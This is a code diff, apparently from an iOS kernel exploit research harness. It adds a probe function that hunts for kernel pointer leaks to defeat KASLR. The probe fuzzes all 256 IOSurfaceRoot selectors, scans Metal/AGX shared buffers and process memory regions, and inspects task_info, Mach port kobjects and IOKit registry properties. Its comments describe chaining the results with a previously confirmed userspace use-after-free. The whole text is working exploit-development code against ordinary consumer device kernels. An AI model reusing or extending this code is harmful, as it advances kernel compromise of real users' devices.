@@ -14456,6 +14456,585 @@ static void r350_probe(void) {
     fflush(stdout);
 }
 
+/* r351: KASLR bypass — exhaustive kptr leak hunt.
+ * r298 CONFIRMED: Userspace UAF gives cross-read/cross-write on IOSurface properties.
+ * r292 CONFIRMED: MTE is kernel-only, userspace heap untagged.
+ * ALL conventional KASLR leak APIs patched on iOS 27.1.
+ *
+ * STRATEGY: Three-pronged approach to find ANY kernel pointer leak:
+ *   Part 1: IOSurfaceRoot exhaustive external method scan (256 selectors)
+ *           with both scalar and struct outputs — looking for unmasked kptrs.
+ *   Part 2: Metal/AGX shared buffer scan — GPU command buffers may contain
+ *           kernel pointers written by the kernel for the GPU to process.
+ *   Part 3: vm_region_recurse on IOSurface mappings — the region info's
+ *           object_id or offset fields may leak kernel object addresses.
+ *           Also task_info with TASK_VM_INFO, TASK_DYLD_INFO.
+ *
+ * Any kernel pointer found gives us: kslide = leaked_ptr - known_offset
+ */
+static void r351_probe(void) {
+    rlog("\n=== r351: KASLR Bypass — Exhaustive kptr Leak Hunt ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+    int kptr_total = 0;
+
+    /* Helper: check if a 64-bit value looks like a kernel pointer */
+    #define IS_KPTR(v) ( \
+        ((v) != 0) && \
+        ( ((v) & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL || \
+          ((v) >> 36) == 0xfffffffULL ) \
+    )
+
+    /* ---- Part 1: IOSurfaceRoot full 256-selector scan ---- */
+    rlog("--- Part 1: IOSurfaceRoot exhaustive selector scan ---\n");
+    fflush(stdout);
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (!svc) {
+            rlog("  IOSurfaceRoot: NOT FOUND\n");
+        } else {
+            for (uint32_t ctype = 0; ctype < 4; ctype++) {
+                io_connect_t conn = 0;
+                kr = IOServiceOpen(svc, mach_task_self(), ctype, &conn);
+                if (kr != 0) continue;
+                rlog("  Type %u: conn=0x%x — scanning 256 selectors\n", ctype, conn);
+
+                for (uint32_t sel = 0; sel < 256; sel++) {
+                    /* Try A: scalar output only */
+                    {
+                        uint64_t scOut[8] = {0};
+                        uint32_t scOutCnt = 8;
+                        kr = IOConnectCallMethod(conn, sel,
+                            NULL, 0, NULL, 0,
+                            scOut, &scOutCnt, NULL, NULL);
+                        if (kr == 0 && scOutCnt > 0) {
+                            for (uint32_t i = 0; i < scOutCnt; i++) {
+                                if (IS_KPTR(scOut[i])) {
+                                    rlog("  *** KPTR T%u sel=%u scalar[%u]=0x%llx ***\n",
+                                        ctype, sel, i, (unsigned long long)scOut[i]);
+                                    kptr_total++;
+                                }
+                            }
+                        }
+                    }
+
+                    /* Try B: struct output */
+                    {
+                        uint8_t sout[4096];
+                        memset(sout, 0, sizeof(sout));
+                        size_t soutSz = sizeof(sout);
+                        kr = IOConnectCallMethod(conn, sel,
+                            NULL, 0, NULL, 0,
+                            NULL, NULL, sout, &soutSz);
+                        if (kr == 0 && soutSz >= 8) {
+                            uint64_t *p = (uint64_t *)sout;
+                            size_t cnt = soutSz / 8;
+                            for (size_t i = 0; i < cnt; i++) {
+                                if (IS_KPTR(p[i])) {
+                                    rlog("  *** KPTR T%u sel=%u struct+%zu=0x%llx ***\n",
+                                        ctype, sel, i*8, (unsigned long long)p[i]);
+                                    kptr_total++;
+                                }
+                            }
+                        }
+                    }
+
+                    /* Try C: scalar input (surface ID) + scalar output */
+                    {
+                        uint64_t scIn[1] = {1};
+                        uint64_t scOut[8] = {0};
+                        uint32_t scOutCnt = 8;
+                        kr = IOConnectCallMethod(conn, sel,
+                            scIn, 1, NULL, 0,
+                            scOut, &scOutCnt, NULL, NULL);
+                        if (kr == 0 && scOutCnt > 0) {
+                            for (uint32_t i = 0; i < scOutCnt; i++) {
+                                if (IS_KPTR(scOut[i])) {
+                                    rlog("  *** KPTR T%u sel=%u+id scalar[%u]=0x%llx ***\n",
+                                        ctype, sel, i, (unsigned long long)scOut[i]);
+                                    kptr_total++;
+                                }
+                            }
+                        }
+                    }
+
+                    /* Try D: scalar input + struct output */
+                    {
+                        uint64_t scIn[1] = {1};
+                        uint8_t sout[4096];
+                        memset(sout, 0, sizeof(sout));
+                        size_t soutSz = sizeof(sout);
+                        kr = IOConnectCallMethod(conn, sel,
+                            scIn, 1, NULL, 0,
+                            NULL, NULL, sout, &soutSz);
+                        if (kr == 0 && soutSz >= 8) {
+                            uint64_t *p = (uint64_t *)sout;
+                            size_t cnt = soutSz / 8;
+                            for (size_t i = 0; i < cnt; i++) {
+                                if (IS_KPTR(p[i])) {
+                                    rlog("  *** KPTR T%u sel=%u+id struct+%zu=0x%llx ***\n",
+                                        ctype, sel, i*8, (unsigned long long)p[i]);
+                                    kptr_total++;
+                                }
+                            }
+                        }
+                    }
+                }
+                rlog("  Type %u scan done. kptr_total=%d so far\n", ctype, kptr_total);
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    rlog("  Part 1 kptr_total=%d\n\n", kptr_total);
+    fflush(stdout);
+
+    /* ---- Part 2: Metal/AGX shared buffer kptr scan ---- */
+    rlog("--- Part 2: Metal/AGX shared buffer kernel pointer scan ---\n");
+    fflush(stdout);
+    {
+        void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+        if (!metal_lib) {
+            rlog("  Metal framework: failed to load\n");
+        } else {
+            typedef void *(*MTLCreateDev_t)(void);
+            MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+            void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+            void *(*getClass)(const char*) = dlsym(RTLD_DEFAULT, "objc_getClass");
+            void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+
+            if (!createDev || !msgSend || !getClass || !regSel) {
+                rlog("  Missing Metal/ObjC symbols\n");
+            } else {
+                void *dev = createDev();
+                if (!dev) {
+                    rlog("  MTLCreateSystemDefaultDevice: NULL\n");
+                } else {
+                    rlog("  Metal device: %p\n", dev);
+
+                    /* Create command queue */
+                    void *selNewCQ = regSel("newCommandQueue");
+                    void *cmdQ = ((void*(*)(void*,void*))msgSend)(dev, selNewCQ);
+                    rlog("  CommandQueue: %p\n", cmdQ);
+
+                    /* Create shared buffer 64KB filled with 0x41 */
+                    size_t bufSz = 65536;
+                    void *selNewBuf = regSel("newBufferWithLength:options:");
+                    /* MTLResourceStorageModeShared = 0 */
+                    void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+                        dev, selNewBuf, bufSz, 0UL);
+                    rlog("  SharedBuffer: %p size=%zu\n", buf, bufSz);
+
+                    if (buf) {
+                        /* Get buffer contents pointer */
+                        void *selContents = regSel("contents");
+                        void *ptr = ((void*(*)(void*,void*))msgSend)(buf, selContents);
+                        rlog("  Buffer contents: %p\n", ptr);
+
+                        if (ptr) {
+                            /* Fill with known pattern */
+                            memset(ptr, 0x41, bufSz);
+
+                            if (cmdQ) {
+                                /* Create command buffer and commit empty to get GPU to touch mem */
+                                void *selNewCB = regSel("commandBuffer");
+                                void *cmdBuf = ((void*(*)(void*,void*))msgSend)(cmdQ, selNewCB);
+                                if (cmdBuf) {
+                                    /* Encode a blit to fill the buffer */
+                                    void *selBlit = regSel("blitCommandEncoder");
+                                    void *blit = ((void*(*)(void*,void*))msgSend)(cmdBuf, selBlit);
+                                    if (blit) {
+                                        /* fillBuffer:range:value: */
+                                        void *selFill = regSel("fillBuffer:range:value:");
+                                        typedef struct { unsigned long loc; unsigned long len; } NSRange;
+                                        NSRange range = {0, bufSz};
+                                        ((void(*)(void*,void*,void*,NSRange,uint8_t))msgSend)(
+                                            blit, selFill, buf, range, 0xBB);
+                                        void *selEnd = regSel("endEncoding");
+                                        ((void(*)(void*,void*))msgSend)(blit, selEnd);
+                                    }
+
+                                    void *selCommit = regSel("commit");
+                                    ((void(*)(void*,void*))msgSend)(cmdBuf, selCommit);
+
+                                    void *selWait = regSel("waitUntilCompleted");
+                                    ((void(*)(void*,void*))msgSend)(cmdBuf, selWait);
+                                    rlog("  GPU blit completed\n");
+                                }
+                            }
+
+                            /* Scan for kernel pointers in the shared buffer */
+                            uint64_t *bp = (uint64_t *)ptr;
+                            size_t qwords = bufSz / 8;
+                            int buf_kptr = 0;
+                            for (size_t i = 0; i < qwords; i++) {
+                                if (IS_KPTR(bp[i])) {
+                                    rlog("  *** KPTR buf+%zu=0x%llx ***\n",
+                                        i*8, (unsigned long long)bp[i]);
+                                    buf_kptr++;
+                                    kptr_total++;
+                                    if (buf_kptr >= 20) break;
+                                }
+                            }
+                            rlog("  Shared buffer kptr count: %d\n", buf_kptr);
+                        }
+
+                        /* Release buffer */
+                        void *selRelease = regSel("release");
+                        ((void(*)(void*,void*))msgSend)(buf, selRelease);
+                    }
+
+                    /* Scan AGX shared memory regions near the device */
+                    rlog("\n  Scanning AGX VM regions for kptrs...\n");
+                    {
+                        mach_vm_address_t addr = 0;
+                        mach_vm_size_t sz = 0;
+                        uint32_t depth = 0;
+                        struct vm_region_submap_info_64 info;
+                        mach_msg_type_number_t cnt;
+                        int agx_kptr = 0;
+                        int regions = 0;
+
+                        while (regions < 500) {
+                            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                            depth = 0;
+                            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz,
+                                &depth, (vm_region_recurse_info_t)&info, &cnt);
+                            if (kr != 0) break;
+
+                            /* Check object_id — may be kernel address on some versions */
+                            if (IS_KPTR((uint64_t)info.object_id)) {
+                                rlog("  *** KPTR region 0x%llx obj_id=0x%x ***\n",
+                                    (unsigned long long)addr, info.object_id);
+                                agx_kptr++;
+                                kptr_total++;
+                            }
+
+                            /* Scan readable, non-writable regions for stale kptrs */
+                            if ((info.protection & VM_PROT_READ) && sz <= 1048576 && sz > 0) {
+                                uint64_t *rp = (uint64_t *)(uintptr_t)addr;
+                                size_t rqw = (size_t)sz / 8;
+                                for (size_t i = 0; i < rqw && i < 131072; i++) {
+                                    uint64_t v = 0;
+                                    /* Safe read — catch faults */
+                                    volatile uint64_t *vp = (volatile uint64_t *)&rp[i];
+                                    v = *vp;
+                                    if (IS_KPTR(v)) {
+                                        rlog("  *** KPTR vm 0x%llx+%zu=0x%llx prot=%x ***\n",
+                                            (unsigned long long)addr, i*8,
+                                            (unsigned long long)v, info.protection);
+                                        agx_kptr++;
+                                        kptr_total++;
+                                        if (agx_kptr >= 30) break;
+                                    }
+                                }
+                            }
+
+                            addr += sz;
+                            regions++;
+                            if (agx_kptr >= 30) break;
+                        }
+                        rlog("  Scanned %d regions, AGX kptrs: %d\n", regions, agx_kptr);
+                    }
+
+                    if (cmdQ) {
+                        void *selRelease = regSel("release");
+                        ((void(*)(void*,void*))msgSend)(cmdQ, selRelease);
+                    }
+                    /* dev is autoreleased */
+                }
+            }
+            dlclose(metal_lib);
+        }
+    }
+    rlog("  Part 2 kptr_total=%d\n\n", kptr_total);
+    fflush(stdout);
+
+    /* ---- Part 3: vm_region_recurse + task_info kptr scan ---- */
+    rlog("--- Part 3: vm_region_recurse + task_info kptr scan ---\n");
+    fflush(stdout);
+    {
+        /* Part 3A: Create IOSurfaces of various sizes, map them, check vm_region info */
+        int sizes[] = {64, 128, 256, 512, 1024, 2048, 4096};
+        for (int si = 0; si < 7; si++) {
+            int sz = sizes[si];
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int bpe=4, bpr=sz*4, pf=0x42475241, as=sz*sz*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&sz);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&sz);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn2=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn2);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn2);CFRelease(pfn);CFRelease(asn);
+
+            IOSurfaceRef s = IOSurfaceCreate(p);
+            CFRelease(p);
+            if (!s) continue;
+
+            IOSurfaceLock(s, 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(s);
+            if (base) {
+                mach_vm_address_t raddr = (mach_vm_address_t)(uintptr_t)base;
+                mach_vm_size_t rsz = 0;
+                uint32_t depth = 0;
+                struct vm_region_submap_info_64 rinfo;
+                mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+
+                kr = mach_vm_region_recurse(mach_task_self(), &raddr, &rsz, &depth,
+                    (vm_region_recurse_info_t)&rinfo, &rcnt);
+                if (kr == 0) {
+                    rlog("  %dx%d base=%p region: addr=0x%llx sz=0x%llx prot=%x "
+                         "offset=0x%llx obj_id=%u user_tag=%u\n",
+                        sz, sz, base, (unsigned long long)raddr,
+                        (unsigned long long)rsz, rinfo.protection,
+                        (unsigned long long)rinfo.offset,
+                        rinfo.object_id, rinfo.user_tag);
+
+                    /* Check offset field — might be a kernel virtual address */
+                    if (IS_KPTR((uint64_t)rinfo.offset)) {
+                        rlog("  *** KPTR offset=0x%llx for %dx%d ***\n",
+                            (unsigned long long)rinfo.offset, sz, sz);
+                        kptr_total++;
+                    }
+                }
+            }
+            IOSurfaceUnlock(s, 0, NULL);
+            CFRelease(s);
+        }
+        rlog("\n");
+
+        /* Part 3B: task_info with various flavors */
+        rlog("  task_info scan:\n");
+        {
+            /* TASK_BASIC_INFO */
+            struct task_basic_info tbi;
+            mach_msg_type_number_t cnt = TASK_BASIC_INFO_COUNT;
+            kr = task_info(mach_task_self(), TASK_BASIC_INFO, (task_info_t)&tbi, &cnt);
+            if (kr == 0) {
+                rlog("    TASK_BASIC_INFO: virt=%u res=%u\n",
+                    (unsigned)tbi.virtual_size, (unsigned)tbi.resident_size);
+            }
+
+            /* TASK_DYLD_INFO */
+            struct task_dyld_info tdi;
+            cnt = TASK_DYLD_INFO_COUNT;
+            kr = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&tdi, &cnt);
+            if (kr == 0) {
+                rlog("    TASK_DYLD_INFO: all_image_info_addr=0x%llx sz=%llu fmt=%u\n",
+                    tdi.all_image_info_addr, tdi.all_image_info_size,
+                    tdi.all_image_info_format);
+                if (IS_KPTR(tdi.all_image_info_addr)) {
+                    rlog("    *** KPTR all_image_info_addr=0x%llx ***\n",
+                        tdi.all_image_info_addr);
+                    kptr_total++;
+                }
+            }
+
+            /* TASK_VM_INFO (flavor 22) */
+            uint64_t vminfo[80];
+            memset(vminfo, 0, sizeof(vminfo));
+            cnt = sizeof(vminfo)/sizeof(natural_t);
+            kr = task_info(mach_task_self(), 22, (task_info_t)vminfo, &cnt);
+            if (kr == 0) {
+                rlog("    TASK_VM_INFO: cnt=%u\n", cnt);
+                for (uint32_t i = 0; i < cnt/2 && i < 40; i++) {
+                    if (IS_KPTR(vminfo[i])) {
+                        rlog("    *** KPTR TASK_VM_INFO[%u]=0x%llx ***\n",
+                            i, (unsigned long long)vminfo[i]);
+                        kptr_total++;
+                    }
+                }
+            }
+
+            /* TASK_EXTMOD_INFO (flavor 19) */
+            uint64_t extmod[16];
+            memset(extmod, 0, sizeof(extmod));
+            cnt = sizeof(extmod)/sizeof(natural_t);
+            kr = task_info(mach_task_self(), 19, (task_info_t)extmod, &cnt);
+            if (kr == 0) {
+                rlog("    TASK_EXTMOD_INFO: cnt=%u\n", cnt);
+                for (uint32_t i = 0; i < cnt/2 && i < 8; i++) {
+                    if (IS_KPTR(extmod[i])) {
+                        rlog("    *** KPTR EXTMOD[%u]=0x%llx ***\n",
+                            i, (unsigned long long)extmod[i]);
+                        kptr_total++;
+                    }
+                }
+            }
+        }
+
+        /* Part 3C: Mach port space info scan */
+        rlog("\n  Mach port kobject scan:\n");
+        {
+            /* Create IOSurface mach ports and check kobject */
+            for (int trial = 0; trial < 5; trial++) {
+                CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+                CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+                CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+                CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+                CFNumberRef rn2=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+                CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+                CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+                CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+                CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+                CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+                CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn2);
+                CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+                CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+                CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn2);CFRelease(pfn);CFRelease(asn);
+
+                IOSurfaceRef s = IOSurfaceCreate(p);
+                CFRelease(p);
+                if (!s) continue;
+
+                mach_port_t mp = IOSurfaceCreateMachPort(s);
+                if (mp != MACH_PORT_NULL) {
+                    unsigned int kotype = 0;
+                    mach_vm_address_t kaddr = 0;
+                    kr = mach_port_kobject(mach_task_self(), mp, &kotype, (unsigned int *)&kaddr);
+                    rlog("    trial %d: port=0x%x kobject kr=0x%x type=%u addr=0x%llx\n",
+                        trial, mp, kr, kotype, (unsigned long long)kaddr);
+                    if (IS_KPTR(kaddr)) {
+                        rlog("    *** KPTR mach_port_kobject=0x%llx ***\n",
+                            (unsigned long long)kaddr);
+                        kptr_total++;
+                    }
+                    mach_port_deallocate(mach_task_self(), mp);
+                }
+                CFRelease(s);
+            }
+        }
+
+        /* Part 3D: IOKit registry entry ID — might encode kernel addresses */
+        rlog("\n  IOKit registry scan:\n");
+        {
+            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (svc) {
+                uint64_t regID = 0;
+                IORegistryEntryGetRegistryEntryID(svc, &regID);
+                rlog("    IOSurfaceRoot regID=0x%llx\n", (unsigned long long)regID);
+                if (IS_KPTR(regID)) {
+                    rlog("    *** KPTR regID=0x%llx ***\n", (unsigned long long)regID);
+                    kptr_total++;
+                }
+
+                /* Try to get properties that might contain kernel pointers */
+                CFMutableDictionaryRef allProps = NULL;
+                kr = IORegistryEntryCreateCFProperties(svc, &allProps,
+                    kCFAllocatorDefault, 0);
+                if (kr == 0 && allProps) {
+                    CFIndex propCount = CFDictionaryGetCount(allProps);
+                    rlog("    IOSurfaceRoot properties: %ld\n", (long)propCount);
+
+                    /* Enumerate all properties looking for numbers that could be kptrs */
+                    CFIndex cnt2 = CFDictionaryGetCount(allProps);
+                    const void **keys2 = (const void **)malloc(cnt2 * sizeof(void*));
+                    const void **vals2 = (const void **)malloc(cnt2 * sizeof(void*));
+                    CFDictionaryGetKeysAndValues(allProps, keys2, vals2);
+
+                    for (CFIndex i = 0; i < cnt2; i++) {
+                        if (CFGetTypeID(vals2[i]) == CFNumberGetTypeID()) {
+                            int64_t numval = 0;
+                            CFNumberGetValue(vals2[i], kCFNumberSInt64Type, &numval);
+                            if (IS_KPTR((uint64_t)numval)) {
+                                char kbuf[128] = {0};
+                                CFStringGetCString(keys2[i], kbuf, sizeof(kbuf),
+                                    kCFStringEncodingUTF8);
+                                rlog("    *** KPTR prop '%s'=0x%llx ***\n",
+                                    kbuf, (unsigned long long)numval);
+                                kptr_total++;
+                            }
+                        }
+                    }
+                    free(keys2);
+                    free(vals2);
+                    CFRelease(allProps);
+                }
+
+                /* Also check AGXAccelerator properties */
+                io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("AGXAccelerator"));
+                if (agx) {
+                    CFMutableDictionaryRef agxProps = NULL;
+                    kr = IORegistryEntryCreateCFProperties(agx, &agxProps,
+                        kCFAllocatorDefault, 0);
+                    if (kr == 0 && agxProps) {
+                        CFIndex acnt = CFDictionaryGetCount(agxProps);
+                        rlog("    AGXAccelerator properties: %ld\n", (long)acnt);
+
+                        const void **akeys = (const void **)malloc(acnt * sizeof(void*));
+                        const void **avals = (const void **)malloc(acnt * sizeof(void*));
+                        CFDictionaryGetKeysAndValues(agxProps, akeys, avals);
+
+                        for (CFIndex i = 0; i < acnt; i++) {
+                            if (CFGetTypeID(avals[i]) == CFNumberGetTypeID()) {
+                                int64_t numval = 0;
+                                CFNumberGetValue(avals[i], kCFNumberSInt64Type, &numval);
+                                if (IS_KPTR((uint64_t)numval)) {
+                                    char kbuf[128] = {0};
+                                    CFStringGetCString(akeys[i], kbuf, sizeof(kbuf),
+                                        kCFStringEncodingUTF8);
+                                    rlog("    *** KPTR AGX prop '%s'=0x%llx ***\n",
+                                        kbuf, (unsigned long long)numval);
+                                    kptr_total++;
+                                }
+                            } else if (CFGetTypeID(avals[i]) == CFDataGetTypeID()) {
+                                CFIndex dlen = CFDataGetLength(avals[i]);
+                                if (dlen >= 8) {
+                                    const uint64_t *dp = (const uint64_t *)CFDataGetBytePtr(avals[i]);
+                                    CFIndex dqw = dlen / 8;
+                                    for (CFIndex j = 0; j < dqw && j < 64; j++) {
+                                        if (IS_KPTR(dp[j])) {
+                                            char kbuf[128] = {0};
+                                            CFStringGetCString(akeys[i], kbuf, sizeof(kbuf),
+                                                kCFStringEncodingUTF8);
+                                            rlog("    *** KPTR AGX data '%s'+%lld=0x%llx ***\n",
+                                                kbuf, (long long)(j*8), (unsigned long long)dp[j]);
+                                            kptr_total++;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        free(akeys);
+                        free(avals);
+                        CFRelease(agxProps);
+                    }
+                    IOObjectRelease(agx);
+                }
+
+                IOObjectRelease(svc);
+            }
+        }
+    }
+
+    /* Write state file */
+    {
+        uint32_t state[4] = {0xDEAD0351, (uint32_t)kptr_total, 0, 0};
+        FILE *sf = fopen("r351_state.bin", "wb");
+        if (sf) { fwrite(state, 1, sizeof(state), sf); fclose(sf); }
+    }
+
+    rlog("\n  === SUMMARY: Total kernel pointer candidates: %d ===\n", kptr_total);
+    rlog("\n=== r351 complete ===\n");
+    fflush(stdout);
+
+    #undef IS_KPTR
+}
+
 /* r349: Kalloc size-class oracle via OOL spray
  * r348 showed IOSurface backing store unchanged — surfaces are in a different
  * zone from the VPS table. Need to find which kalloc size class the VPS table
@@ -49043,6 +49622,15 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 354) {
+            rlog("*** rounds=354: KASLR Bypass — Exhaustive kptr Leak Hunt ***\n");
+            rlog("  r298: Userspace UAF confirmed. All conv. leaks patched.\n");
+            rlog("  Probe: IOSurfaceRoot 256-sel scan, Metal/AGX shared buf,\n");
+            rlog("  vm_region_recurse, task_info, IOKit registry props.\n\n");
+            fflush(stdout);
+            r351_probe();
             goto done;
         }
         if (rounds == 353) {
